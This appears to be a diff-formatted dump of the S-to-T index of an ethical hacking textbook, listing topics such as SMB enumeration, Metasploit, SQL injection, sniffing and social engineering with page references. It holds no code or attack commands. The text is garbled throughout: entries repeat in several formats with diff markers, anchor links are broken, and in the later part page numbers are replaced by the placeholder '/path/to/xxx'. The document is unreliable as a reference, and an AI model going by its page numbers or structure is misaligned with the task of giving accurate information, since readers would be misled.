+  - built‑in utilities, [`#c06.xhtml#Page_243`]–247
+  - countermeasures, [`#c06.xhtml#Page_257`]
+  - Metasploit, [`#c06.xhtml#Page_250`]–254
+  - NetBIOS Enumerator, [`#c06.xhtml#Page_249`]–250
+  - `nmap` scripts, [`#c06.xhtml#Page_247`]–249
+  - other utilities, [`#c06.xhtml#Page_254`]–257
+- server‑side request forgery, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_515`]
+- service enumeration
+  - about, [`#c06.xhtml#Page_233`]
+  - countermeasures, [`#c06.xhtml#Page_236`]
+  - `nmap` version scan, [`#c06.xhtml#Page_233`]–234
+  - SSH2 algorithm enumeration, [`#c06.xhtml#Page_234`]–236
+- service level agreement (SLA), [`#c03.xhtml#Page_71`]
+- service set identifier (SSID), [`#c11.xhtml#Page_477`]
+- service‑oriented architecture, [`#c14.xhtml#Page_591`]–593
+- services, cloud, [`#c15.xhtml#Page_616`]–621
+- session border controller (SBC), [`#c03.xhtml#Page_79`]
+- Session Initiation Protocol (SIP), [`#c03.xhtml#Page_79`]
+- session key, [`#c11.xhtml#Page_494`]
+- Session layer (OSI model), [`#c02.xhtml#Page_22`]
+- `sessions` command, [`#c07.xhtml#Page_317`]–318
+- SET (Social‑Engineer Toolkit), [`#c10.xhtml#Page_461`]–464
+- SETI@Home, [`#c15.xhtml#Page_624`]
+- SHA‑1 (Secure Hash Algorithm [`#c01.xhtml#Page_1`]), [`#c13.xhtml#Page_570`]
+- SHA‑2 (Secure Hash Algorithm [`#c01.xhtml#Page_2`]), [`#c13.xhtml#Page_570`]
+- SHA‑256, [`#c08.xhtml#Page_357`]
+- shared responsibility model, [`#c15.xhtml#Page_621`]–623
+- shell, [`#c07.xhtml#Page_307`]
+- shellcode, [`#c12.xhtml#Page_533`, `#c12.xhtml#Page_535`]
+- `Sherlock` tool, [`#c04.xhtml#Page_120`]
+- Shodan, [`#c04.xhtml#Page_152`]–154, [`#c15.xhtml#Page_646`]–648
+- Short Message Service (SMS), [`#c11.xhtml#Page_501`, `#c14.xhtml#Page_603`]
+- SIEM (security information and event management), [`#c03.xhtml#Page_86`]–87, [`#c12.xhtml#Page_541`]
+- signature, [`#c05.xhtml#Page_219`]
+- Simple Authority, [`#c13.xhtml#Page_562`]–563
+- simple data classification, [`#c14.xhtml#Page_583`]
+- Simple Identity Property, [`#c14.xhtml#Page_585`]
+- Simple Mail Transfer Protocol (SMTP)
+  - about, [`#c01.xhtml#Page_13`, `#c03.xhtml#Page_91`, `#c06.xhtml#Page_232`, `#c06.xhtml#Page_260`]–263
+  - countermeasures, `263`–`264`
+- Simple Network Management Protocol (`SNMP`)
+  - about, `232`, `258`–`259`
+  - countermeasures, `259`–`260`
+- Simple Secure Pairing (`SSP`), `496`
+- Simple Security Property, `586`
+- Simultaneous Authentication of Equals (`SAE`), `482`
+- single crack mode, `296`
+- SIP (`Session Initiation Protocol`), `79`
+- SLA (`service level agreement`), `71`
+- Slack, `501`
+- slow attacks, `529`–`530`
+- `slowhttptest`, `529`–`530`
+- slowloris attack, `529`
+- Smartsheet, `52`
+- SMB (`Server Message Block`)
+  - about, `13`, `180`, `209`, `232`, `242`–`243`
+  - built‑in utilities, `243`–`247`
+  - countermeasures, `257`
+  - Metasploit, `250`–`254`
+  - NetBIOS Enumerator, `249`–`250`
+  - `nmap` scripts, `247`–`249`
+  - other utilities, `254`–`257`
+- `smb_login` module, `252`
+- S/MIME (`Secure/Multipurpose Internet Mail Extensions`), `571`–`572`
+- smishing, `440`
+- SMS (`Short Message Service`), `501`, `603`
+- SMTP (`Simple Mail Transfer Protocol`)
+  - about, `13`, `91`, `232`, `260`–`263`
+  - countermeasures, `263`–`264`
+- Smurf attack, `527`
+- sniffing
+  - about, `395`, `428`–`429`
+  - answers to review questions, `681`–`683`
+  - detecting sniffers, `410`–`412`
+  - packet analysis, `412`–`417`
+  - packet capture, `395`–`410`
+  - review questions, `430`–`434`
+  - spoofing attacks, `417`–`428`
+  - as a Wi‑Fi attack, `485`–`498`
+- SNMP (`Simple Network Management Protocol`)
+  - about, `232`, `258`–`259`
+  - countermeasures, `259`–`260`
+- `Snort` rules, `82`
+- SOA (`start of authority`) records, `132`, `139`
+- SOC (`security operations center`), `86`–`87`
+- social engineering
+  - about, `436`–`438`, `464`–`465`
+  - answers to review questions, `683`–`685`
+  - automating, `461`–`464`
+  - badge access, `442`–`444`
+  - baiting, `447`–`448`
+  - biometrics, `445`–`446`
 
-*   Samba, [`#c06.xhtml#Page_243`, `#c06.xhtml#Page_255`]
 
-*   sandboxing, [`#c08.xhtml#Page_361`, `#c11.xhtml#Page_501`]
 
-*   SARA (Security Auditors Research Assistant), [`#c05.xhtml#Page_191`]–192
+- cloning, `454`–`457`
 
-*   SATAN (Security Analysis Tool for Auditing Networks), [`#c05.xhtml#Page_191`]–192
+- contact spamming, `452`
 
-*   Satori, [`#c04.xhtml#Page_152`]
+- identity theft, `441`
 
-*   SBC (session border controller), [`#c03.xhtml#Page_79`]
+- man traps, `444`–`445`
 
-*   SCADA (supervisory control and data acquisition), [`#c15.xhtml#Page_652`]–653, [`#c15.xhtml#Page_654`]
+- phishing attacks, `448`–`452`
 
-*   scan configs, in OpenVAS, [`#c05.xhtml#Page_195`]–198
+- phone calls, `446`–`447`
 
-*   scanning 
+- physical, `442`–`448`
 
-    *   Bluetooth, [`#c11.xhtml#Page_496`]–498
+- pretexting, `438`–`440`
 
-    *   in ethical hacking, [`#c01.xhtml#Page_12`]–13
+- quid pro quo, `452`
 
-    *   networks 
+- review questions, `466`–`470`
 
-        *   about, [`#c05.xhtml#Page_162`]–163, [`#c05.xhtml#Page_224`]–225
+- rogue attacks, `457`–`458`
 
-        *   answers to review questions, [`#b01.xhtml#Page_669`]–672
+- social networking, `453`
 
-        *   evasion techniques, [`#c05.xhtml#Page_218`]–223
+- tailgating, `448`
 
-        *   packet crafting and manipulation, [`#c05.xhtml#Page_210`]–218
+- vectors, `440`–`441`
 
-        *   ping sweeps, [`#c05.xhtml#Page_163`]–166
+- website attacks, `454`–`458`
 
-        *   port scanning, [`#c05.xhtml#Page_167`]–190
+- wireless, `458`–`461`
 
-        *   protecting and detecting, [`#c05.xhtml#Page_223`]–224
+- social networking
 
-        *   review questions, [`#c05.xhtml#Page_226`]–229
+  - about, `115`–`116`
 
-        *   vulnerability scanning, [`#c05.xhtml#Page_190`]–210
+  - Facebook, `116`–`119`
 
-*   scarcity, in theory of influence, [`#c10.xhtml#Page_437`]
+  - job sites, `128`–`129`
 
-*   screen blindness, as an evasion technique, [`#c05.xhtml#Page_220`]
+  - LinkedIn, `120`–`123`
 
-*   scripting, [`#c05.xhtml#Page_176`]–181
+  - social engineering, `453`
 
-*   searching, for exploits, [`#c07.xhtml#Page_281`]–285
+  - Twitter, `123`–`128`
 
-*   `searchsploit` tool, [`#c07.xhtml#Page_283`, `#c07.xhtml#Page_292`]
+  - username search, `120`
 
-*   SEC (Securities and Exchange Commission), [`#c04.xhtml#Page_104`]
+- Social Security numbers, `441`
 
-*   Secret classification, [`#c14.xhtml#Page_583`]
+- Social‑Engineer Toolkit (`SET`), `461`–`464`
 
-*   secure hash algorithm, [`#c07.xhtml#Page_297`]
+- software as a service, `51`–`53`
 
-*   Secure Hash Algorithm 1 (SHA‑1), [`#c13.xhtml#Page_570`]
+- software integrity failures, as one of OWASP top ten vulnerabilities, `515`
 
-*   Secure Hash Algorithm 2 (SHA‑2), [`#c13.xhtml#Page_570`]
+- Song, Dug, `419`
 
-*   Secure Sockets Layer (SSL) 
+- Source Address field, `33`
 
-    *   about, [`#c02.xhtml#Page_46`]
+- Source Port field, `37`
 
-    *   for encryption, [`#c09.xhtml#Page_406`]
+- SPAN (`Switched Port Analyzer`), `410`
 
-    *   for encryption for web‑based communication, [`#c03.xhtml#Page_62`]
+- split DNS, `136`–`137`, `142`
 
-*   secure state, [`#c14.xhtml#Page_586`]
+- Splunk, `329`, `541`
 
-*   Secure/Multipurpose Internet Mail Extensions (S/MIME), [`#c13.xhtml#Page_571`]–572
+- spoofing attacks
 
-*   Securities and Exchange Commission (SEC), [`#c04.xhtml#Page_104`]
+  - about, `417`–`418`, `428`–`429`
 
-*   security 
+  - Address Resolution Protocol (`ARP`) spoofing, `418`–`422`
 
-    *   about, [`#c03.xhtml#Page_60`, `#c03.xhtml#Page_95`]
+  - detecting, `426`–`428`
 
-    *   answers to review questions, [`#b01.xhtml#Page_663`]–666
+  - DHCP starvation attack, `424`–`426`
 
-    *   architecture and design 
+  - Domain Name System (`DNS`) spoofing, `422`–`424`
 
-        *   about, [`#c14.xhtml#Page_582`, `#c14.xhtml#Page_598`]–602, [`#c14.xhtml#Page_604`]–605
+- SQL (`Structured Query Language`), `513`, `590`, `643`
 
-        *   answers to review questions, [`#b01.xhtml#Page_693`]–695
+- SQL databases, `595`
 
-        *   application architecture, [`#c14.xhtml#Page_587`]–598
+- SQL injection, `518`–`521`, `596`
 
-        *   data classification, [`#c14.xhtml#Page_582`]–584
+- SQLite databases, `598`
 
-        *   review questions, [`#c14.xhtml#Page_606`]–609
+- SSH2 algorithm enumeration, `234`–`236`
 
-        *   security architecture, [`#c14.xhtml#Page_588`]–604
+- SSID (`service set identifier`), `477`
 
-        *   security models, [`#c14.xhtml#Page_584`]–587
+- SSL (`Secure Sockets Layer`)
 
-        *   zero‑trust model, [`#c14.xhtml#Page_602`]–604
+  - about, `46`
 
-    *   auditing, [`#c03.xhtml#Page_93`]–95
+  - for encryption, `406`
 
-    *   CIA triad, [`#c03.xhtml#Page_61`]–65
+  - for encryption for web‑based communication, `62`
 
-    *   defense‑in‑breadth approach, [`#c03.xhtml#Page_89`]–90
+- `sslstrip`, `425`–`426`, `492`
 
-    *   defense‑in‑depth approach, [`#c03.xhtml#Page_87`]–89
+- SSP (`Simple Secure Pairing`), `496`
 
-    *   defensible network architecture, [`#c03.xhtml#Page_90`]–91
+- StaaS (`storage as a service`), `47`–`48`
 
-    *   guidelines, [`#c03.xhtml#Page_72`]
+- stack canary, `534`
 
-    *   information assurance and risk, [`#c03.xhtml#Page_66`]–69
+- stacks, `19`, `532`
 
-    *   logging, [`#c03.xhtml#Page_91`]–93
+- standards
 
-    *   logging and monitoring failures, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_515`]
+  - security, `70`–`71`
 
-    *   misconfiguration, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_514`]
+  - Wi‑Fi, `472`–`473`
 
-    *   models for, [`#c14.xhtml#Page_584`]–587
+- \* (star) Identity Property, `585`
 
-    *   organizing protections, [`#c03.xhtml#Page_72`]–75
+- star network, `25`
 
-    *   policies, [`#c03.xhtml#Page_69`]–70
+- \* (star) Property, `586`
 
-    *   procedures, [`#c03.xhtml#Page_71`]–72
+- start of authority (`SOA`) records, `132`, `139`
 
-    *   review questions, [`#c03.xhtml#Page_96`]–99
+- state machine model, `584`–`585`
 
-    *   standards, [`#c03.xhtml#Page_70`]–71
+- stateful filtering, `77`–`78`
 
-    *   technology for, [`#c03.xhtml#Page_75`]–87
+- stateless architecture, `634`–`635`
 
-    *   wireless (*See* `wireless security`)
+- static analysis
 
-*   Security Administrator's Integrated Network Tool (SAINT), [`#c05.xhtml#Page_191`]–192
+  - about, `350`–`351`
 
-*   Security Analysis Tool for Auditing Networks (SATAN), [`#c05.xhtml#Page_191`]–192
+  - disassembly, `354`–`356`
 
-*   Security Auditors Research Assistant (SARA), [`#c05.xhtml#Page_191`]–192
+  - encryptors, `351`–`353`
 
-*   security control, [`#c14.xhtml#Page_599`]
+  - packers, `351`–`353`
 
-*   security information and event management (SIEM), [`#c03.xhtml#Page_86`]–87, [`#c12.xhtml#Page_541`]
+  - properties, `356`
 
-*   security operations center (SOC), [`#c03.xhtml#Page_86`]–87
+  - using Ghidra, `358`–`361`
 
-*   segment, [`#c02.xhtml#Page_37`]
+  - VirusTotal, `356`–`358`
 
-*   `SELECT` query, [`#c14.xhtml#Page_598`]
+- storage as a service (`StaaS`), `47`–`48`
 
-*   self‑propagation, [`#c08.xhtml#Page_342`]
+- stream cipher, `236`
 
-*   self‑signed certificates, [`#c13.xhtml#Page_566`]–568
+- Structured Query Language (`SQL`), `513`, `590`, `643`
 
-*   semi‑authorized entities, [`#c01.xhtml#Page_4`]
+- stub, `351`
 
-*   Sequence Number field, [`#c02.xhtml#Page_38`]
+- subnets, `35`–`37`
 
-*   Server Message Block (SMB) 
+- substitution ciphers, `551`–`553`
 
-    *   about, [`#c01.xhtml#Page_13`, `#c05.xhtml#Page_180`, `#c05.xhtml#Page_209`, `#c06.xhtml#Page_232`, `#c06.xhtml#Page_242`]–243
+- SunRPC, `237`–`239`
 
-    *   built‑in utilities, [`#c06.xhtml#Page_243`]–247
+- `sunrpc` scanner, `238`–`239`
 
-    *   countermeasures, [`#c06.xhtml#Page_257`]
+- supercomputers, `624`
 
-    *   Metasploit, [`#c06.xhtml#Page_250`]–254
+- superuser privileges, `212`
 
-    *   NetBIOS Enumerator, [`#c06.xhtml#Page_249`]–250
+- supervisory control and data acquisition (`SCADA`), `652`–`653`, `654`
 
-    *   `nmap` scripts, [`#c06.xhtml#Page_247`]–249
+- Switched Port Analyzer (`SPAN`), `/path/to/xxx`
 
-    *   other utilities, [`#c06.xhtml#Page_254`]–257
+- switching, `/path/to/xxx`–31
 
-*   server‑side request forgery, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_515`]
+- symmetric key cryptography
 
-*   service enumeration 
+  - about, `/path/to/xxx`
 
-    *   about, [`#c06.xhtml#Page_233`]
+  - Advanced Encryption Standard (`AES`), `/path/to/xxx`–558
 
-    *   countermeasures, [`#c06.xhtml#Page_236`]
+  - Data Encryption Standard (`DES`), `/path/to/xxx`–556
 
-    *   `nmap` version scan, [`#c06.xhtml#Page_233`]–234
+- SYN flag, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`
 
-    *   SSH2 algorithm enumeration, [`#c06.xhtml#Page_234`]–236
+- syslog standard, `/path/to/xxx`–92
 
-*   service level agreement (SLA), [`#c03.xhtml#Page_71`]
+- system
 
-*   service set identifier (SSID), [`#c11.xhtml#Page_477`]
+  - compromise
 
-*   service‑oriented architecture, [`#c14.xhtml#Page_591`]–593
+    - about, `/path/to/xxx`–286
 
-*   services, cloud, [`#c15.xhtml#Page_616`]–621
+    - `exploit‑db`, `/path/to/xxx`–292
 
-*   session border controller (SBC), [`#c03.xhtml#Page_79`]
+    - Metasploit modules, `/path/to/xxx`–289
 
-*   Session Initiation Protocol (SIP), [`#c03.xhtml#Page_79`]
+  - hacking
 
-*   session key, [`#c11.xhtml#Page_494`]
+    - about, `/path/to/xxx`–281, `/path/to/xxx`–333
 
-*   Session layer (OSI model), [`#c02.xhtml#Page_22`]
+    - answers to review questions, `/path/to/xxx`–678
 
-*   `sessions` command, [`#c07.xhtml#Page_317`]–318
+    - client‑side vulnerabilities, `/path/to/xxx`–307
 
-*   SET (Social‑Engineer Toolkit), [`#c10.xhtml#Page_461`]–464
+    - fuzzing, `/path/to/xxx`–313
 
-*   SETI@Home, [`#c15.xhtml#Page_624`]
+    - gathering password, `/path/to/xxx`–295
 
-*   SHA‑1 (Secure Hash Algorithm [`#c01.xhtml#Page_1`]), [`#c13.xhtml#Page_570`]
+    - living off the land, `/path/to/xxx`–308
 
-*   SHA‑2 (Secure Hash Algorithm [`#c01.xhtml#Page_2`]), [`#c13.xhtml#Page_570`]
+    - password cracking, `/path/to/xxx`–304
 
-*   SHA‑256, [`#c08.xhtml#Page_357`]
+    - post exploitation, `/path/to/xxx`–332
 
-*   shared responsibility model, [`#c15.xhtml#Page_621`]–623
+    - review questions, `/path/to/xxx`–337
 
-*   shell, [`#c07.xhtml#Page_307`]
+    - searching for exploits, `/path/to/xxx`–285
 
-*   shellcode, [`#c12.xhtml#Page_533`, `#c12.xhtml#Page_535`]
+    - system compromise, `/path/to/xxx`–292
 
-*   Sherlock tool, [`#c04.xhtml#Page_120`]
+- `system()`, `/path/to/xxx`
 
-*   Shodan, [`#c04.xhtml#Page_152`]–154, [`#c15.xhtml#Page_646`]–648
+- tailgating, `/path/to/xxx`
 
-*   Short Message Service (SMS), [`#c11.xhtml#Page_501`, `#c14.xhtml#Page_603`]
+- TCP (`Transmission Control Protocol`)
 
-*   SIEM (security information and event management), [`#c03.xhtml#Page_86`]–87, [`#c12.xhtml#Page_541`]
+  - about, `/path/to/xxx`–40
 
-*   signature, [`#c05.xhtml#Page_219`]
+  - architecture, `/path/to/xxx`–24
 
-*   Simple Authority, [`#c13.xhtml#Page_562`]–563
+  - port scanning and, `/path/to/xxx`
 
-*   simple data classification, [`#c14.xhtml#Page_583`]
+  - stateful filtering and, `/path/to/xxx`
 
-*   Simple Identity Property, [`#c14.xhtml#Page_585`]
+  - as a Transport layer protocol, `/path/to/xxx`
 
-*   Simple Mail Transfer Protocol (SMTP) 
+- TCP scanning, `/path/to/xxx`–171
 
-    *   about, [`#c01.xhtml#Page_13`, `#c03.xhtml#Page_91`, `#c06.xhtml#Page_232`, `#c06.xhtml#Page_260`]–263
+- `tcpdump`, `/path/to/xxx`–401, `/path/to/xxx`–409, `/path/to/xxx`–487
 
+- techniques, tactics, and procedures (`TTPs`), `/path/to/xxx`
 
+- technology
 
--   countermeasures, `263`–`264`
--   Simple Network Management Protocol (`SNMP`)
-    *   about, `232`, `258`–`259`
-    *   countermeasures, `259`–`260`
--   Simple Secure Pairing (`SSP`), `496`
--   Simple Security Property, `586`
--   Simultaneous Authentication of Equals (`SAE`), `482`
--   single crack mode, `296`
--   SIP (`Session Initiation Protocol`), `79`
--   SLA (`service level agreement`), `71`
--   Slack, `501`
--   slow attacks, `529`–`530`
--   `slowhttptest`, `529`–`530`
--   slowloris attack, `529`
--   Smartsheet, `52`
--   SMB (`Server Message Block`)
-    *   about, `13`, `180`, `209`, `232`, `242`–`243`
-    *   built‑in utilities, `243`–`247`
-    *   countermeasures, `257`
-    *   Metasploit, `250`–`254`
-    *   NetBIOS Enumerator, `249`–`250`
-    *   `nmap` scripts, `247`–`249`
-    *   other utilities, `254`–`257`
--   `smb_login` module, `252`
--   S/MIME (`Secure/Multipurpose Internet Mail Extensions`), `571`–`572`
--   smishing, `440`
--   SMS (`Short Message Service`), `501`, `603`
--   SMTP (`Simple Mail Transfer Protocol`)
-    *   about, `13`, `91`, `232`, `260`–`263`
-    *   countermeasures, `263`–`264`
--   Smurf attack, `527`
--   sniffing
-    *   about, `395`, `428`–`429`
-    *   answers to review questions, `681`–`683`
-    *   detecting sniffers, `410`–`412`
-    *   packet analysis, `412`–`417`
-    *   packet capture, `395`–`410`
-    *   review questions, `430`–`434`
-    *   spoofing attacks, `417`–`428`
-    *   as a Wi‑Fi attack, `485`–`498`
--   SNMP (`Simple Network Management Protocol`)
-    *   about, `232`, `258`–`259`
-    *   countermeasures, `259`–`260`
--   Snort rules, `82`
--   SOA (`start of authority`) records, `132`, `139`
--   SOC (`security operations center`), `86`–`87`
--   social engineering
-    *   about, `436`–`438`, `464`–`465`
-    *   answers to review questions, `683`–`685`
-    *   automating, `461`–`464`
-    *   badge access, `442`–`444`
-    *   baiting, `447`–`448`
-    *   biometrics, `445`–`446`
-    *   cloning, `454`–`457`
-    *   contact spamming, `452`
-    *   identity theft, `441`
-    *   man traps, `444`–`445`
-    *   phishing attacks, `448`–`452`
-    *   phone calls, `446`–`447`
-    *   physical, `442`–`448`
-    *   pretexting, `438`–`440`
-    *   quid pro quo, `452`
-    *   review questions, `466`–`470`
-    *   rogue attacks, `457`–`458`
-    *   social networking, `453`
-    *   tailgating, `448`
-    *   vectors, `440`–`441`
-    *   website attacks, `454`–`458`
-    *   wireless, `458`–`461`
--   social networking
-    *   about, `115`–`116`
-    *   Facebook, `116`–`119`
-    *   job sites, `128`–`129`
-    *   LinkedIn, `120`–`123`
-    *   social engineering, `453`
-    *   Twitter, `123`–`128`
-    *   username search, `120`
--   Social Security numbers, `441`
--   Social‑Engineer Toolkit (`SET`), `461`–`464`
--   software as a service, `51`–`53`
--   software integrity failures, as one of OWASP top ten vulnerabilities, `515`
--   Song, Dug, `419`
--   Source Address field, `33`
--   Source Port field, `37`
--   SPAN (`Switched Port Analyzer`), `410`
--   split DNS, `136`–`137`, `142`
--   Splunk, `329`, `541`
--   spoofing attacks
-    *   about, `417`–`418`, `428`–`429`
-    *   Address Resolution Protocol (`ARP`) spoofing, `418`–`422`
-    *   detecting, `426`–`428`
-    *   DHCP starvation attack, `424`–`426`
-    *   Domain Name System (`DNS`) spoofing, `422`–`424`
--   SQL (`Structured Query Language`), `513`, `590`, `643`
--   SQL databases, `595`
--   SQL injection, `518`–`521`, `596`
--   SQLite databases, `598`
--   SSH2 algorithm enumeration, `234`–`236`
--   SSID (`service set identifier`), `477`
--   SSL (`Secure Sockets Layer`)
-    *   about, `46`
-    *   for encryption, `406`
-    *   for encryption for web‑based communication, `62`
--   `sslstrip`, `425`–`426`, `492`
--   SSP (`Simple Secure Pairing`), `496`
--   StaaS (`storage as a service`), `47`–`48`
--   stack canary, `534`
--   stacks, `19`, `532`
--   standards
-    *   security, `70`–`71`
-    *   Wi‑Fi, `472`–`473`
--   \* (star) Identity Property, `585`
--   star network, `25`
--   \* (star) Property, `586`
--   start of authority (`SOA`) records, `132`, `139`
--   state machine model, `584`–`585`
--   stateful filtering, `77`–`78`
--   stateless architecture, `634`–`635`
--   static analysis
-    *   about, `350`–`351`
-    *   disassembly, `354`–`356`
-    *   encryptors, `351`–`353`
-    *   packers, `351`–`353`
-    *   properties, `356``
-    *   using Ghidra, `358`–`361`
-    *   VirusTotal, `356`–`358`
--   storage as a service (`StaaS`), `47`–`48`
--   stream cipher, `236`
--   Structured Query Language (`SQL`), `513`, `590`, `643`
--   stub, `351`
--   subnets, `35`–`37`
--   substitution ciphers, `551`–`553`
--   SunRPC, `237`–`239`
--   `sunrpc` scanner, `238`–`239`
--   supercomputers, `624`
--   superuser privileges, `212`
--   supervisory control and data acquisition (`SCADA`), `652`–`653`, `654`
-
-
-
--   Switched Port Analyzer (SPAN), `/path/to/xxx`
--   switching, `/path/to/xxx`–31
--   symmetric key cryptography
-    -   about, `/path/to/xxx`
-    -   Advanced Encryption Standard (`AES`), `/path/to/xxx`–558
-    -   Data Encryption Standard (`DES`), `/path/to/xxx`–556
--   SYN flag, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`, `/path/to/xxx`
--   syslog standard, `/path/to/xxx`–92
--   system
-    -   compromise
-        -   about, `/path/to/xxx`–286
-        -   `exploit‑db`, `/path/to/xxx`–292
-        -   Metasploit modules, `/path/to/xxx`–289
-    -   hacking
-        -   about, `/path/to/xxx`–281, `/path/to/xxx`–333
-        -   answers to review questions, `/path/to/xxx`–678
-        -   client‑side vulnerabilities, `/path/to/xxx`–307
-        -   fuzzing, `/path/to/xxx`–313
-        -   gathering password, `/path/to/xxx`–295
-        -   living off the land, `/path/to/xxx`–308
-        -   password cracking, `/path/to/xxx`–304
-        -   post exploitation, `/path/to/xxx`–332
-        -   review questions, `/path/to/xxx`–337
-        -   searching for exploits, `/path/to/xxx`–285
-        -   system compromise, `/path/to/xxx`–292
--   `system()`, `/path/to/xxx`
--   tailgating, `/path/to/xxx`
--   TCP (`Transmission Control Protocol`)
-    -   about, `/path/to/xxx`–40
-    -   architecture, `/path/to/xxx`–24
-    -   port scanning and, `/path/to/xxx`
-    -   stateful filtering and, `/path/to/xxx`
-    -   as a Transport layer protocol, `/path/to/xxx`
--   TCP scanning, `/path/to/xxx`–171
--   `tcpdump`, `/path/to/xxx`–401, `/path/to/xxx`–409, `/path/to/xxx`–487
--   techniques, tactics, and procedures (`TTPs`), `/path/to/xxx`
--   technology
-    -   endpoint detection and response (`EDR`), `/path/to/xxx`–85
-    -   firewalls, `/path/to/xxx`–80
-    -   intelligence of, `/path/to/xxx`–154
-    -   intrusion detection systems (`IDSs`), `/path/to/xxx`–83
-    -   intrusion prevention systems (`IPSs`), `/path/to/xxx`–84
-    -   security, `/path/to/xxx`–87
-    -   security information and event management (`SEIM`), `/path/to/xxx`–87
--   Temporal Key Integrity Protocol (`TKIP`), `/path/to/xxx`
--   `10Base2`, as a Physical layer protocol, `/path/to/xxx`
--   `10BaseT`, as a Physical layer protocol, `/path/to/xxx`
--   terminators, `/path/to/xxx`
--   terminology, `/path/to/xxx`
--   Terraform, `/path/to/xxx`
--   testing
-    -   networks, `/path/to/xxx`
-    -   web application attacks, `/path/to/xxx`
--   `theHarvester`, `/path/to/xxx`–115
--   threat agent/entity, `/path/to/xxx`
--   `3DES` (`Triple DES`), `/path/to/xxx`
--   three‑way handshake, `/path/to/xxx`
--   ticket‑granting system (`TGS`), `/path/to/xxx`–302
--   time management, `/path/to/xxx`
--   Time to Live (`TTL`) field, `/path/to/xxx`, `/path/to/xxx`
--   `TKIP` (`Temporal Key Integrity Protocol`), `/path/to/xxx`
--   `TLS` (`Transport Layer Security`)
-    -   about, `/path/to/xxx`, `/path/to/xxx`
-    -   cryptography and, `/path/to/xxx`
-    -   for encryption for web‑based communication, `/path/to/xxx`
--   Tomcat, `/path/to/xxx`, `/path/to/xxx`
--   Top Secret classification, `/path/to/xxx`
--   top‑level domains (`TLDs`), `/path/to/xxx`, `/path/to/xxx`
--   topologies
-    -   about, `/path/to/xxx`
-    -   bus network, `/path/to/xxx`–25
-    -   hybrid, `/path/to/xxx`–29
-    -   mesh network, `/path/to/xxx`–28
-    -   ring network, `/path/to/xxx`
-    -   star network, `/path/to/xxx`
--   `ToS` (`Type of Service`) field, `/path/to/xxx`
--   Total Length field, `/path/to/xxx`
--   `TPM` (`trusted platform module`), `/path/to/xxx`–573
--   `TPs` (`Transformation Procedures`), `/path/to/xxx`
--   tracks, covering in ethical hacking, `/path/to/xxx`–15, `/path/to/xxx`
--   transference, of risk, `/path/to/xxx`–69
--   `Transformation Procedures` (`TPs`), `/path/to/xxx`
--   `Transmission Control Protocol` (`TCP`)
-    -   about, `/path/to/xxx`–40
-    -   architecture, `/path/to/xxx`–24
-    -   port scanning and, `/path/to/xxx`
-    -   stateful filtering and, `/path/to/xxx`
-    -   as a Transport layer protocol, `/path/to/xxx`
--   Transport layer (`OSI` model), `/path/to/xxx`
--   Transport Layer Security (`TLS`)
-    -   about, `/path/to/xxx`, `/path/to/xxx`
-    -   cryptography and, `/path/to/xxx`
-    -   for encryption for web‑based communication, `/path/to/xxx`
--   traversal, directory/file, `/path/to/xxx`–523
--   Trend Micro software, `/path/to/xxx`
--   `Trickbot`, `/path/to/xxx`
--   `Triple DES` (`3DES`), `/path/to/xxx`
--   `Tripwire`, `/path/to/xxx`
--   `Trojan`, `/path/to/xxx`
--   true negative vulnerability, `/path/to/xxx`
--   true positive vulnerability, `/path/to/xxx`
--   `trusted platform module` (`TPM`), `/path/to/xxx`–573
--   `trusted third party`, `/path/to/xxx`–566
--   `tshark`, `/path/to/xxx`–403
--   `TTL` (`Time to Live`) field, `/path/to/xxx`, `/path/to/xxx`
--   `TTPs` (`techniques, tactics, and procedure`), `/path/to/xxx`
+  - endpoint detection and response (`EDR`), `/path/to/xxx`–85
+
+  - firewalls, `/path/to/xxx`–80
+
+  - intelligence of, `/path/to/xxx`–154
+
+  - intrusion detection systems (`IDSs`), `/path/to/xxx`–83
+
+  - intrusion prevention systems (`IPSs`), `/path/to/xxx`–84
+
+  - security, `/path/to/xxx`–87
+
+  - security information and event management (`SEIM`), `/path/to/xxx`–87
+
+- Temporal Key Integrity Protocol (`TKIP`), `/path/to/xxx`
+
+- `10Base2`, as a Physical layer protocol, `/path/to/xxx`
+
+- `10BaseT`, as a Physical layer protocol, `/path/to/xxx`
+
+- terminators, `/path/to/xxx`
+
+- terminology, `/path/to/xxx`
+
+- Terraform, `/path/to/xxx`
+
+- testing
+
+  - networks, `/path/to/xxx`
+
+  - web application attacks, `/path/to/xxx`
+
+- `theHarvester`, `/path/to/xxx`–115
+
+- threat agent/entity, `/path/to/xxx`
+
+- `3DES` (`Triple DES`), `/path/to/xxx`
+
+- three‑way handshake, `/path/to/xxx`
+
+- ticket‑granting system (`TGS`), `/path/to/xxx`–302
+
+- time management, `/path/to/xxx`
+
+- Time to Live (`TTL`) field, `/path/to/xxx`, `/path/to/xxx`
+
+- `TKIP` (`Temporal Key Integrity Protocol`), `/path/to/xxx`
+
+- `TLS` (`Transport Layer Security`)
+
+  - about, `/path/to/xxx`, `/path/to/xxx`
+
+  - cryptography and, `/path/to/xxx`
+
+  - for encryption for web‑based communication, `/path/to/xxx`
+
+- Tomcat, `/path/to/xxx`, `/path/to/xxx`
+
+- Top Secret classification, `/path/to/xxx`
+
+- top‑level domains (`TLDs`), `/path/to/xxx`, `/path/to/xxx`
+
+- topologies
+
+  - about, `/path/to/xxx`
+
+  - bus network, `/path/to/xxx`–25
+
+  - hybrid, `/path/to/xxx`–29
+
+  - mesh network, `/path/to/xxx`–28
+
+  - ring network, `/path/to/xxx`
+
+  - star network, `/path/to/xxx`
+
+- `ToS` (`Type of Service`) field, `/path/to/xxx`
+
+- Total Length field, `/path/to/xxx`
+
+- `TPM` (`trusted platform module`), `/path/to/xxx`–573
+
+- `TPs` (`Transformation Procedures`), `/path/to/xxx`
+
+- tracks, covering in ethical hacking, `/path/to/xxx`–15, `/path/to/xxx`
+
+- transference, of risk, `/path/to/xxx`–69
+
+- `Transformation Procedures` (`TPs`), `/path/to/xxx`
+
+- `Transmission Control Protocol` (`TCP`)
+
+  - about, `/path/to/xxx`–40
+
